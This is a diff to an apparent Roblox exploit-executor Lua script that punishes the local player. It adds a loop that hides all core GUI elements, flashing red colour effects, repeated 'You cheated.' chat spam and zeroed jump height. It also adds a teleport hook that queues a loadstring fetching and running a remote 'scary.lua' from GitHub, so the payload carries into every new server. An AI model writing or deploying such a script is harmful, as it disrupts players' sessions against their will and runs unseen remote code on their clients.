@@ -2,12 +2,23 @@ local Lighting = game:GetService("Lighting")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TextChatService = game:GetService("TextChatService")
 local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = Players.LocalPlayer
 
 local isLegacyChat = TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService
 
 local Red = Instance.new("ColorCorrectionEffect", Lighting)
+
+local coreGuiTypeNames = {
+    Enum.CoreGuiType.Backpack,
+    Enum.CoreGuiType.PlayerList,
+    Enum.CoreGuiType.EmotesMenu
+}
+
+for _, enumItem in ipairs(Enum.CoreGuiType:GetEnumItems()) do
+    table.insert(coreGuiTypeNames, enumItem)
+end
 
 function chatMessage(str)
     str = tostring(str)
@@ -33,26 +44,42 @@ Red.Contrast = -2558222
 Red.Brightness = -1555
 
 task.spawn(function()
-	while task.wait() do
-		Red.Brightness = math.random(-155555, -1555)
-	end
+    while task.wait(0.01) do
+        for _, guiType in pairs(coreGuiTypeNames) do
+            StarterGui:SetCore(guiType, false)
+        end
+    end
 end)
 
 task.spawn(function()
-	while task.wait() do
-		Red.Contrast = math.random(-2558222, 2558222)
-	end
+    while task.wait() do
+        Red.Brightness = math.random(-155555, -1555)
+    end
 end)
 
 task.spawn(function()
-	while task.wait() do
-		Red.Saturation = math.random(-1, 0)
-	end
+    while task.wait() do
+        Red.Contrast = math.random(-2558222, 2558222)
+    end
+end)
+
+task.spawn(function()
+    while task.wait() do
+        Red.Saturation = math.random(-1, 0)
+    end
 end)
 
 for i=1,3 do
     chatMessage('You cheated.')
 end
+
+task.spawn(function()
+    while task.wait(1) do
+        for i=1,3 do
+            chatMessage('You cheated.')
+        end
+    end
+end)
 
 task.spawn(function()
     while task.wait(0.01) do
@@ -74,5 +101,12 @@ task.spawn(function()
                 Humanoid.JumpHeight = 0
             end
         end
+    end
+end)
+
+LocalPlayer.OnTeleport:Connect(function(State)
+    qtp = queueteleport or queue_teleport or function(...) end
+    if qtp then
+        qtp("loadstring(game:HttpGet('https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/scary.lua'))()")
     end
 end)
